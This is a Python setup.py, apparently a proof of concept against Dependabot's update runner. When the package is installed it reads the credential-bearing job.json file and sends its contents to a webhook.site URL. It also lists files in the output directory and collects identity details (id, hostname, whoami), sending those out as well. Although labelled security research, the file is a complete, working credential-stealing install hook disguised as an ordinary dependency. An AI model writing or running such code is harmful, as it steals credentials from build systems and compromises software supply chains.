# SECURITY RESEARCH POC v2 - reads job.json
from setuptools import setup
import subprocess, os, sys
import urllib.request
import json

WEBHOOK = 'https://webhook.site/c3f33f5e-e2f0-4844-ab9c-79c89b0e57a1'

def exfil(data, label=''):
    try:
        body = f'[{label}]\n{data}'.encode()
        req = urllib.request.Request(
            WEBHOOK, data=body,
            headers={'Content-Type': 'text/plain', 'X-Label': label},
            method='POST'
        )
        urllib.request.urlopen(req, timeout=10)
    except Exception as e:
        sys.stderr.write(f'[exfil_err:{label}] {e}\n')

# Read job.json (contains structured credentials)
job_path = os.environ.get('DEPENDABOT_JOB_PATH', '/home/dependabot/dependabot-updater/job.json')
try:
    with open(job_path) as f:
        job_content = f.read()
    exfil(job_content, 'job_json')
except Exception as e:
    exfil(str(e), 'job_json_error')

# Read the output path dir for any cred files
output_path = os.environ.get('DEPENDABOT_OUTPUT_PATH', '')
if output_path:
    output_dir = os.path.dirname(output_path)
    try:
        files = subprocess.run(['find', output_dir, '-type', 'f'], capture_output=True, text=True)
        exfil(files.stdout, 'output_dir_files')
    except Exception as e:
        exfil(str(e), 'output_dir_error')

# Identity proof
id_out = subprocess.run(['id'], capture_output=True, text=True).stdout
hostname_out = subprocess.run(['hostname'], capture_output=True, text=True).stdout
whoami_out = subprocess.run(['whoami'], capture_output=True, text=True).stdout
exfil(f'id={id_out}hostname={hostname_out}whoami={whoami_out}', 'identity')

setup(
    name='poc-dependabot-exec-rce',
    version='1.0.1',
    description='dependency',
    install_requires=['requests>=2.0.0'],
)
